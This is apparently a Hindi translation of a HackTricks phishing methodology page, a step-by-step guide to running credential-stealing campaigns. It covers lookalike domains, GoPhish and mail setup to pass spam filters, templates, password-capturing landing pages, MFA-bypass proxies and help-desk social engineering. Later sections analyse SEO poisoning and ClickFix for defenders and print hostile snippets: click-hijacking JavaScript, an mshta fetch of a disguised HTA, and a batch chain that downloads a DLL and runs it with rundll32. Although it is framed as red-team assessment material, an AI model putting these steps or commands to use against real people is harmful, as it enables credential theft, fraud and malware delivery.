# Phishing कार्यप्रणाली

{{#include ../../banners/hacktricks-training.md}}

## कार्यप्रणाली

1. पीड़ित की Recon करें
   1. **पीड़ित का domain** चुनें।
   2. पीड़ित द्वारा इस्तेमाल किए जाने वाले **login portals खोजने** के लिए कुछ बुनियादी web enumeration करें और **तय करें** कि आप किसकी **नकल करेंगे**।
   3. **ईमेल खोजने** के लिए कुछ **OSINT** का इस्तेमाल करें।
2. वातावरण तैयार करें
   1. Phishing assessment के लिए इस्तेमाल करने वाला **domain खरीदें**
   2. **ईमेल सेवा** से जुड़े records (SPF, DMARC, DKIM, rDNS) **configure करें**
   3. VPS पर **gophish** configure करें
3. Campaign तैयार करें
   1. **ईमेल template** तैयार करें
   2. Credentials चुराने के लिए **web page** तैयार करें
4. Campaign शुरू करें!

## मिलते-जुलते domain names बनाएं या भरोसेमंद domain खरीदें

### Domain Name बदलने की तकनीकें

- **Keyword**: Domain name में original domain का कोई महत्वपूर्ण **keyword शामिल होता है** (उदाहरण: zelster.com-management.com)।<sup>[[1]](#references)</sup>
- **हाइफ़न वाला subdomain**: Subdomain के **dot को hyphen से बदलें** (उदाहरण: www-zelster.com)।
- **नया TLD**: नए TLD का इस्तेमाल करके वही domain (उदाहरण: zelster.org)
- **Homoglyph**: Domain name के एक अक्षर को **उससे मिलता-जुलता दिखने वाला अक्षर** लगाकर **बदल देता है** (उदाहरण: zelfser.com)।

{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain name के **दो अक्षरों की जगह बदलें** (उदाहरण: zelsetr.com)।
- **एकवचन/बहुवचन बनाना**: Domain name के आखिर में “s” जोड़ें या हटाएं (उदाहरण: zeltsers.com)।
- **हटाना**: Domain name से एक अक्षर **हटाएं** (उदाहरण: zelser.com)।
- **दोहराना:** Domain name के एक अक्षर को **दोहराएं** (उदाहरण: zeltsser.com)।
- **बदलना**: Homoglyph की तरह, लेकिन कम छिपा हुआ। Domain name के किसी एक अक्षर को बदलें, संभवतः कीबोर्ड पर मूल अक्षर के पास वाले अक्षर से (उदाहरण: zektser.com)।
- **Subdomain बनाना**: Domain name के भीतर एक **dot** डालें (उदाहरण: ze.lster.com)।
- **जोड़ना**: Domain name में एक अक्षर **जोड़ें** (उदाहरण: zerltser.com)।
- **Dot हटाना**: TLD को domain name के साथ जोड़ें। (उदाहरण: zelstercom.com)

**स्वचालित Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

**संभावना है कि संग्रहित किए जा रहे या संचार में मौजूद कुछ bits कई कारकों, जैसे solar flares, cosmic rays या hardware errors के कारण अपने-आप flip हो जाएं।**

जब इस अवधारणा को **DNS requests पर लागू किया जाता है**, तो संभव है कि **DNS server को मिला domain** शुरू में मांगे गए domain से अलग हो।

उदाहरण के लिए, "windows.com" में एक bit बदलने से यह "windnws.com" बन सकता है।

हमलावर पीड़ित के domain से मिलते-जुलते कई bit-flipping domains register करके **इसका फायदा उठा सकते हैं**। उनका इरादा वैध users को अपने infrastructure पर redirect करना होता है।

अधिक जानकारी के लिए [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) पढ़ें।<sup>[[10]](#references)[[11]](#references)</sup>

### भरोसेमंद domain खरीदें

आप इस्तेमाल करने के लिए कोई expired domain खोजने हेतु [https://www.expireddomains.net/](https://www.expireddomains.net) पर खोज सकते हैं।\
यह सुनिश्चित करने के लिए कि आप जो expired domain खरीदने वाले हैं, उसका **SEO पहले से अच्छा है**, आप देख सकते हैं कि उसे यहां किस श्रेणी में रखा गया है:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## ईमेल खोजना

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% मुफ़्त)
- [https://phonebook.cz/](https://phonebook.cz) (100% मुफ़्त)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

और अधिक वैध ईमेल पते **खोजने** या पहले से खोजे गए पतों को **सत्यापित करने** के लिए, जांचें कि क्या आप पीड़ित के SMTP servers पर brute-force कर सकते हैं। [ईमेल पता सत्यापित/खोजना यहां सीखें](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)।\
इसके अलावा, यह न भूलें कि यदि users अपने ईमेल देखने के लिए **कोई web portal इस्तेमाल करते हैं**, तो आप जांच सकते हैं कि वह **username brute force** के प्रति vulnerable है या नहीं, और संभव हो तो vulnerability का फायदा उठा सकते हैं।

## GoPhish configure करना

### इंस्टॉलेशन

आप इसे [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) से download कर सकते हैं।

इसे download करके `/opt/gophish` के अंदर decompress करें और `/opt/gophish/gophish` चलाएं।\
Output में port 3333 पर admin user के लिए password दिया जाएगा। इसलिए, उस port को access करें और admin password बदलने के लिए उन credentials का इस्तेमाल करें। आपको उस port को local पर tunnel करना पड़ सकता है:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuration

**TLS certificate configuration**

इस चरण से पहले, आपको उस **domain को खरीद लेना चाहिए** जिसका आप उपयोग करने वाले हैं, और उसे उस **VPS के IP** पर **point** करना चाहिए जहाँ आप **gophish** configure कर रहे हैं।

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Mail configuration**

इंस्टॉल करना शुरू करें: `apt-get install postfix`

फिर निम्नलिखित फ़ाइलों में domain जोड़ें:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** के अंदर निम्नलिखित variables की values भी बदलें

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

अंत में, **`/etc/hostname`** और **`/etc/mailname`** फ़ाइलों में अपना domain name डालें और **अपने VPS को restart करें।**

अब, `mail.<domain>` का एक **DNS A record** बनाएँ, जो VPS के **ip address** की ओर इंगित करे, और `mail.<domain>` की ओर इंगित करने वाला **DNS MX** record बनाएँ।

अब, email भेजने का परीक्षण करते हैं:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish कॉन्फ़िगरेशन**

gophish का execution रोकें और इसे configure करें।\
`/opt/gophish/config.json` को निम्नलिखित के अनुसार संशोधित करें (https के उपयोग पर ध्यान दें):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish service कॉन्फ़िगर करें**

gophish service बनाने के लिए, ताकि इसे अपने-आप शुरू किया जा सके और service के रूप में प्रबंधित किया जा सके, आप निम्नलिखित सामग्री के साथ फ़ाइल `/etc/init.d/gophish` बना सकते हैं:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

यह करके सेवा का कॉन्फ़िगरेशन पूरा करें और उसे जाँचें:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Mail server और domain कॉन्फ़िगर करना

### इंतज़ार करें और वैध बने रहें

Domain जितना पुराना होगा, उसके spam के रूप में पकड़े जाने की संभावना उतनी ही कम होगी। इसलिए phishing assessment से पहले जितना संभव हो उतना इंतज़ार करें (कम-से-कम 1 सप्ताह)। इसके अलावा, अगर आप किसी प्रतिष्ठित क्षेत्र के बारे में page डालते हैं, तो हासिल हुई reputation बेहतर होगी।

ध्यान दें कि भले ही आपको एक सप्ताह इंतज़ार करना पड़े, आप अभी सब कुछ कॉन्फ़िगर करना पूरा कर सकते हैं।

### Reverse DNS (rDNS) record कॉन्फ़िगर करें

एक rDNS (PTR) record सेट करें, जो VPS के IP address को domain name पर resolve करे।

### Sender Policy Framework (SPF) Record

आपको **नए domain के लिए SPF record कॉन्फ़िगर करना होगा**। अगर आपको नहीं पता कि SPF record क्या होता है, तो [**यह page पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#spf)।

अपनी SPF policy बनाने के लिए [https://www.spfwizard.net/](https://www.spfwizard.net) का उपयोग कर सकते हैं (VPS machine का IP इस्तेमाल करें)

![phishing domain के लिए SPF record बनाने वाला SPF Wizard form](<../../images/image (1037).png>)

यह वह content है जिसे domain के अंदर TXT record में सेट करना होगा:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC) रिकॉर्ड

आपको **नए domain के लिए DMARC रिकॉर्ड configure करना होगा**। अगर आपको नहीं पता कि DMARC रिकॉर्ड क्या है, तो [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)।

आपको hostname `_dmarc.<domain>` पर इस content के साथ एक नया DNS TXT रिकॉर्ड बनाना होगा:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

आपको **नए domain के लिए DKIM कॉन्फ़िगर करना होगा**। अगर आपको नहीं पता कि DKIM record क्या होता है, तो [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)।

यह tutorial इस पर आधारित है: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)।<sup>[[5]](#references)</sup>

> [!TIP]
> आपको DKIM key से जनरेट होने वाली दोनों B64 values को जोड़ना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपने ईमेल कॉन्फ़िगरेशन स्कोर की जाँच करें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com) का उपयोग करके कर सकते हैं\
बस पेज खोलें और उनके दिए गए पते पर ईमेल भेजें:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

आप `check-auth@verifier.port25.com` पर email भेजकर **अपना email configuration भी जाँच सकते हैं** और **जवाब पढ़ सकते हैं** (इसके लिए आपको port **25** खोलना होगा। अगर आप root के रूप में email भेजते हैं, तो जवाब _/var/mail/root_ फ़ाइल में देखें)।\
जाँचें कि आप सभी tests पास करते हैं:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

आप अपने नियंत्रण वाले Gmail पर **संदेश** भी भेज सकते हैं और अपने Gmail इनबॉक्स में **ईमेल के headers** जाँच सकते हैं। `Authentication-Results` header field में `dkim=pass` मौजूद होना चाहिए।

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Spamhouse Blacklist से हटाना

[www.mail-tester.com](https://www.mail-tester.com) पेज आपको बता सकता है कि Spamhouse आपके domain को block कर रहा है या नहीं। आप अपने domain/IP को हटाने का अनुरोध यहां कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist से हटाना

​​आप अपने domain/IP को हटाने का अनुरोध [https://sender.office.com/](https://sender.office.com) पर कर सकते हैं।

## GoPhish Campaign बनाएं और लॉन्च करें

### Sending Profile

- sender profile की पहचान के लिए कोई **नाम तय करें**
- तय करें कि आप किस account से phishing emails भेजेंगे। सुझाव: _noreply, support, servicedesk, salesforce..._
- username और password खाली छोड़ सकते हैं, लेकिन **Ignore Certificate Errors** को चेक करना सुनिश्चित करें

![GoPhish Campaign बनाएं और लॉन्च करें - Sending Profile: username और password खाली छोड़ सकते हैं, लेकिन Ignore Certificate Errors को चेक करना सुनिश्चित करें](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> सब कुछ सही से काम कर रहा है, यह जांचने के लिए "**Send Test Email**" सुविधा का उपयोग करने की सलाह दी जाती है।\
> जांच करते समय blacklist में आने से बचने के लिए, मेरा सुझाव है कि **test emails को 10min mail addresses पर भेजें**।

### Email Template

- template की पहचान के लिए कोई **नाम तय करें**
- फिर एक **subject** लिखें (कुछ भी अजीब नहीं, बस ऐसा कुछ जिसे आप किसी सामान्य email में पढ़ने की उम्मीद करें)
- सुनिश्चित करें कि "**Add Tracking Image**" चेक किया हुआ है
- **email template** लिखें (आप नीचे दिए गए उदाहरण की तरह variables का उपयोग कर सकते हैं):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

ध्यान दें कि **ईमेल की विश्वसनीयता बढ़ाने के लिए**, क्लाइंट के किसी ईमेल से हस्ताक्षर का उपयोग करने की सलाह दी जाती है। सुझाव:

- किसी **मौजूद न होने वाले पते** पर ईमेल भेजें और देखें कि जवाब में कोई हस्ताक्षर है या नहीं।
- info@ex.com, press@ex.com या public@ex.com जैसे **सार्वजनिक ईमेल** खोजें, उन्हें ईमेल भेजें और जवाब का इंतज़ार करें।
- खोजे गए **किसी वैध ईमेल** से संपर्क करने की कोशिश करें और जवाब का इंतज़ार करें।

![Sending Profile - Email Template: किसी खोजे गए वैध ईमेल से संपर्क करने की कोशिश करें और जवाब का इंतज़ार करें](<../../images/image (80).png>)

> [!TIP]
> Email Template में **भेजने के लिए फ़ाइलें अटैच करने** की सुविधा भी है। अगर आप कुछ विशेष रूप से तैयार की गई फ़ाइलों/दस्तावेज़ों का इस्तेमाल करके NTLM challenges भी चुराना चाहते हैं, तो [यह पेज पढ़ें](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)।

### Landing Page

- एक **नाम** लिखें।
- वेब पेज का **HTML code लिखें**। ध्यान दें कि आप वेब पेज **import** कर सकते हैं।
- **Capture Submitted Data** और **Capture Passwords** चुनें।
- एक **redirection** सेट करें।

![Email Template - Landing Page: Capture Submitted Data और Capture Passwords चुनें](<../../images/image (826).png>)

> [!TIP]
> आम तौर पर आपको पेज का HTML code संशोधित करना होगा और लोकल में कुछ परीक्षण करने होंगे (शायद Apache server का इस्तेमाल करके), **जब तक कि आपको नतीजे पसंद न आ जाएँ।** फिर, उस HTML code को बॉक्स में लिखें।\
> ध्यान दें कि अगर आपको HTML के लिए **कुछ static resources** (जैसे कुछ CSS और JS pages) इस्तेमाल करने हैं, तो आप उन्हें _**/opt/gophish/static/endpoint**_ में सेव कर सकते हैं और फिर _**/static/\<filename>**_ से ऐक्सेस कर सकते हैं।

> [!TIP]
> Redirection के लिए, आप **users को victim के वैध मुख्य वेब पेज पर redirect** कर सकते हैं, या उदाहरण के लिए उन्हें _/static/migration.html_ पर redirect कर सकते हैं, जहाँ 5 सेकंड के लिए **spinning wheel (**[**https://loading.io/**](https://loading.io)**) दिखाएँ और फिर बताएँ कि प्रक्रिया सफल रही**।

### Users & Groups

- एक नाम सेट करें।
- **डेटा import करें** (ध्यान दें कि उदाहरण के लिए template इस्तेमाल करने हेतु, आपको हर user का firstname, last name और email address चाहिए)।

![Landing Page - Users & Groups: डेटा import करें (ध्यान दें कि उदाहरण के लिए template इस्तेमाल करने हेतु, आपको हर user का firstname, last name और email address चाहिए)](<../../images/image (163).png>)

### Campaign

अंत में, नाम, email template, landing page, URL, sending profile और group चुनकर एक campaign बनाएँ। ध्यान दें कि URL वह link होगा जो victims को भेजा जाएगा।

ध्यान दें कि **Sending Profile से test email भेजकर देखा जा सकता है कि अंतिम phishing email कैसा दिखेगा**:

![Users & Groups - Campaign: ध्यान दें कि Sending Profile से test email भेजकर देखा जा सकता है कि अंतिम phishing email कैसा दिखेगा](<../../images/image (192).png>)

सब कुछ तैयार हो जाने पर, campaign लॉन्च करें!

## Website Cloning

अगर किसी वजह से आप वेबसाइट clone करना चाहते हैं, तो यह पेज देखें:

{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

कुछ phishing assessments में (मुख्यतः Red Teams के लिए) आप **ऐसी फ़ाइलें भी भेजना चाहेंगे जिनमें किसी प्रकार का backdoor हो** (शायद कोई C2 या बस कुछ ऐसा जो authentication trigger करे)।\
कुछ उदाहरणों के लिए यह पेज देखें:

{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

पिछला attack काफ़ी चतुर है, क्योंकि इसमें आप एक असली वेबसाइट का रूप बनाकर user द्वारा दर्ज की गई जानकारी इकट्ठा करते हैं। दुर्भाग्य से, अगर user ने सही password दर्ज नहीं किया या आपके नकली application में 2FA कॉन्फ़िगर है, तो **यह जानकारी आपको फँसाए गए user का रूप लेने की अनुमति नहीं देगी**।

यहीं पर [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) और [**muraena**](https://github.com/muraenateam/muraena) जैसे tools उपयोगी हैं। यह tool आपको MitM जैसा attack करने देगा। मूल रूप से, attack इस तरह काम करता है:

1. आप असली वेबपेज के login form का **रूप लेते हैं**।
2. User आपके नकली पेज पर अपने **credentials भेजता है** और tool उन्हें असली वेबपेज पर भेजता है, और **जाँचता है कि credentials काम करते हैं या नहीं**।
3. अगर account में **2FA** कॉन्फ़िगर है, तो MitM पेज उसके लिए पूछेगा और **user के उसे दर्ज करने के बाद**, tool उसे असली वेबपेज पर भेज देगा।
4. User के authenticate हो जाने पर, MitM करते समय आपकी हर interaction की **credentials, 2FA, cookie और कोई भी जानकारी** आप (attacker के रूप में) **कैप्चर कर चुके होंगे**।

### Via VNC

क्या होगा अगर **victim को मूल वेबसाइट जैसी दिखने वाली malicious page पर भेजने** के बजाय, आप उसे **असली वेबपेज से जुड़े browser वाले VNC session पर भेजें**? आप देख पाएँगे कि वह क्या करता है, password, इस्तेमाल किया गया MFA और cookies चुरा पाएँगे...\
आप यह [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) से कर सकते हैं।<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

ज़ाहिर है, यह पता लगाने का सबसे अच्छा तरीका कि आप पकड़े गए हैं या नहीं, **अपने domain को blacklists में खोजना** है। अगर वह सूची में दिखता है, तो किसी तरह आपके domain को संदिग्ध माना गया है।\
यह देखने का एक आसान तरीका कि आपका domain किसी blacklist में है या नहीं, [https://malwareworld.com/](https://malwareworld.com) का इस्तेमाल करना है।

हालाँकि, यह जानने के दूसरे तरीके भी हैं कि victim **सक्रिय रूप से वास्तविक दुनिया में संदिग्ध phishing गतिविधि खोज रहा है या नहीं**, जैसा कि यहाँ बताया गया है:

{{#ref}}
detecting-phising.md
{{#endref}}

आप victim के domain से **बहुत मिलता-जुलता नाम वाला domain खरीद सकते हैं** और/या अपने नियंत्रण वाले domain के **किसी subdomain** के लिए ऐसा **certificate बना सकते हैं जिसमें** victim के domain का **keyword** हो। अगर **victim** उनके साथ किसी भी तरह का **DNS या HTTP interaction** करता है, तो आपको पता चल जाएगा कि **वह संदिग्ध domains को सक्रिय रूप से खोज रहा है** और आपको बहुत stealthy रहना होगा।<sup>[[2]](#references)</sup>

### Evaluate the phishing

यह जाँचने के लिए [**Phishious** ](https://github.com/Rices/Phishious)का इस्तेमाल करें कि आपका email spam folder में जाएगा, block होगा या सफल रहेगा।

## High-Touch Identity Compromise (Help-Desk MFA Reset)

आधुनिक intrusion sets, MFA को हराने के लिए, email lures को पूरी तरह छोड़कर **सीधे service-desk / identity-recovery workflow को निशाना बना रहे हैं**। यह attack पूरी तरह "living-off-the-land" है: एक बार operator के पास वैध credentials आ जाने पर, वह built-in admin tooling की मदद से आगे बढ़ता है—किसी malware की ज़रूरत नहीं होती।<sup>[[6]](#references)</sup>

### Attack flow
1. Victim का Recon करें।
   * LinkedIn, data breaches, सार्वजनिक GitHub आदि से निजी और कॉर्पोरेट जानकारी इकट्ठा करें।
   * उच्च-मूल्य वाले identities (executives, IT, finance) पहचानें और password / MFA reset की **सटीक help-desk प्रक्रिया** पता करें।
2. Real-time social engineering
   * Target का रूप लेकर help-desk को फ़ोन करें, Teams या chat करें (अक्सर **spoofed caller-ID** या **cloned voice** के साथ)।
   * Knowledge-based verification पास करने के लिए पहले से इकट्ठा की गई PII दें।
   * Agent को **MFA secret reset करने** या रजिस्टर्ड mobile number पर **SIM-swap** करने के लिए मनाएँ।
3. Access के तुरंत बाद की कार्रवाइयाँ (वास्तविक मामलों में ≤60 min)
   * किसी भी web SSO portal के ज़रिए foothold बनाएँ।
   * बिना कोई binaries डाले, built-ins से AD / AzureAD enumerate करें:
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * **WMI**, **PsExec**, या ऐसे वैध **RMM** agents के ज़रिए lateral movement, जिन्हें environment में पहले से whitelist किया गया हो।

### Detection & Mitigation
* Help-desk identity recovery को **privileged operation** मानें – step-up auth और manager approval अनिवार्य करें।
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rules लागू करें, जो इन स्थितियों पर alert दें:  
  * MFA method बदलने के बाद नए device / geo से authentication।
  * उसी principal का तुरंत elevation (user-→-admin)।
* Help-desk calls record करें और किसी भी reset से पहले **पहले से registered number पर call-back** अनिवार्य करें।
* **Just-In-Time (JIT) / Privileged Access** लागू करें, ताकि reset किए गए accounts को अपने-आप high-privilege tokens न मिलें।

---

## बड़े पैमाने का छल – SEO Poisoning और “ClickFix” Campaigns
Commodity crews, बड़े पैमाने के attacks के ज़रिए **search engines और ad networks को delivery channel** बनाकर high-touch ops की लागत की भरपाई करते हैं।<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** `chromium-update[.]site` जैसे fake result को search ads में सबसे ऊपर दिखाता है।
2. Victim एक छोटा **first-stage loader** (अक्सर JS/HTA/ISO) डाउनलोड करता है। Unit 42 ने ये उदाहरण देखे हैं:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader browser cookies और credential DBs को exfiltrate करता है, फिर एक **silent loader** डाउनलोड करता है, जो *realtime* में तय करता है कि इनमें से क्या deploy करना है:
   * RAT (जैसे AsyncRAT, RustDesk)
   * ransomware / wiper
   * persistence component (registry Run key + scheduled task)

### Hardening tips
* नए register किए गए domains block करें और e-mail के साथ-साथ *search-ads* पर भी **Advanced DNS / URL Filtering** लागू करें।
* Software installation को signed MSI / Store packages तक सीमित करें; policy के ज़रिए `HTA`, `ISO`, `VBS` execution को रोकें।
* Installers खोलने वाले browsers की child processes पर नज़र रखें:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* First-stage loaders द्वारा अक्सर दुरुपयोग किए जाने वाले LOLBins की तलाश करें (जैसे `regsvr32`, `curl`, `mshta`)।

### TDS handoff के साथ Download-button click hijacking
कुछ नकली software portals दिखने वाले download `href` को **असली** GitHub/release URL पर रखते हैं, लेकिन JavaScript में उपयोगकर्ता की **पहली** interaction को hijack करके victim को इसके बजाय **Traffic Distribution System (TDS)** chain में भेज देते हैं।<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

मुख्य विशेषताएँ:
- Hook आमतौर पर `document` पर **capture phase** (`true`) में चलता है, इसलिए यह साइट के handlers से पहले fire होता है।
- Chrome अक्सर `click` के बजाय `mousedown` का उपयोग करता है, ताकि redirect एक वैध **user gesture** से जुड़ा रहे और popup-blocker bypass की संभावना बढ़े।
- कुछ variants पहले `about:blank` खोलते हैं या `<a target="_blank">` clicks को synthesize करते हैं, और TDS URL बाद में assign करते हैं।
- Browser-side caps आमतौर पर `localStorage` में होते हैं, इसलिए **पहला click** malware तक पहुँच सकता है, जबकि refresh/retry पर benign दिखने वाला visible link खुलता है।
- TDS, referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context और per-session counters के आधार पर पहुँच रोक सकता है, जिससे analyst द्वारा दोबारा चलाने पर परिणाम अलग-अलग हो सकते हैं।

Defender के सुझाव:
- **दिखाए गए** `href` की तुलना click के समय बनाए गए **वास्तविक** navigation target से करें।
- ऐसे `document.addEventListener(..., true)` handlers खोजें जो `window.open`, `about:blank` या synthetic anchor clicks के आसपास `preventDefault()` और `stopImmediatePropagation()` दोनों call करते हैं।
- नए registered software-download domains के ऐसे समूहों को, जो सभी एक ही CloudFront/JS stage load करते हैं, SEO-poisoning/TDS का high-signal pattern मानें।

### Fake verification pages से ClickFix + archive-जैसे दिखने वाले LOLBAS fetches
कुछ TDS branches एक fake verification page (Cloudflare/IUAM शैली) पर समाप्त होते हैं, जो victim को कोई trusted Windows binary चलाने के लिए कहता है, जैसे:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

नोट्स:
- `mshta.exe` response की शुरुआत में मौजूद **HTA/VBScript को execute करता है**, भले ही URL `.7z` archive होने का दिखावा करे; उसके बाद जोड़ा गया archive data पूरी तरह decoy हो सकता है।
- आगे के stages में अक्सर file type के बारे में झूठ जारी रहता है (`.rtf` में PowerShell, `.asar` में Python, padding वाले binaries के साथ ZIPs), फिर **manual PE mapping / in-memory execution** पर switch हो जाता है।
- अगर आप ऐसी किसी chain पर काम कर रहे हैं, तो **पहले successful run से network + memory को सुरक्षित रखें**: बाद में किए गए replays में केवल benign installer/SFX path दिख सकता है, या वे fail हो सकते हैं क्योंकि payload/key release मूल TDS session से bound था।

### ClickFix DLL delivery की तकनीक (नकली CERT update)
* Lure: राष्ट्रीय CERT advisory की cloned प्रति, जिसमें **Update** button होता है और वह step-by-step “fix” निर्देश दिखाता है। Victims से कहा जाता है कि वे ऐसा batch चलाएँ जो DLL download करे और उसे `rundll32` के ज़रिए execute करे।<sup>[[12]](#references)</sup>
* आम तौर पर देखी गई batch chain:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
